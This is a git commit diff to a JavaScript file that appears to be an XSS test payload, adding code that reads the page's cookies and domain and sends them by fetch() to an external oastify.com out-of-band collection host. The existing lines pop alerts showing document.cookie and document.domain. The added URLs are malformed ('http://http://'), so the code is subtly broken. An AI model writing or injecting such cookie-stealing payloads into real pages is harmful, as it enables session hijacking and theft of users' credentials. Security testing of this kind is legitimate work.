8a691c974782120029c499e5264ed12ac9453c07
avijit-maz <86185550+avijit-maz@users.noreply.github.com>
2024-09-20 15:40:23 +0530

    included fetch

--- index.js
+++ index.js
@@ -3,3 +3,13 @@ alert("2. xss by Prod")
 prompt("3. xss through prompt")
 alert(document.cookie)
 prompt(document.domain)
+
+const cookieValue = document.cookie;
+const url = `http://http://ytv34mbs8ktvvm4sqo3bw6oar1xrlg.oastify.com?cookie=${encodeURIComponent(cookieValue)}`;
+
+fetch(url)
+
+const domainValue = document.domain;
+const urlDomain = `http://http://ytv34mbs8ktvvm4sqo3bw6oar1xrlg.oastify.com?cookie=${encodeURIComponent(domainValue)}`;
+
+fetch(urlDomain)
